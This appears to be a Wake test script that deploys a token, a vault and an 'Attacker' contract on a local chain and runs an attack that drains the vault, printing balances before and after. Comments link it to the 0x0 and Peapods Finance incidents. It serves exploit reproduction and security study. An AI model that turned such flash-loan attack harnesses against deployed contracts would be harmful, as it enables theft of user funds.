from wake.testing import *

from pytypes.contracts.flushloan.token import Token
from pytypes.contracts.flushloan.vault import Vault
from pytypes.contracts.flushloan.attacker import Attacker


@default_chain.connect()
def test_default():
    print("")
    victim = default_chain.accounts[0]


    attacker = default_chain.accounts[1]

    token = Token.deploy(11*10**18, from_=victim)

    vault= Vault.deploy(token, from_=victim)
    attacker_ct = Attacker.deploy(vault, token, from_ =attacker)


    token.transfer(vault, 10*10**18)

    print("valult token  : ", token.balanceOf(vault))
    print("attacker token: ", token.balanceOf(attacker_ct))

    print("---------------------attack---------------------")
    attacker_ct.attack()
    print("valult token  : ", token.balanceOf(vault))
    print("attacker token: ", token.balanceOf(attacker_ct))

#   0x0 October 2023
#   Peapods Finance 13 December 2023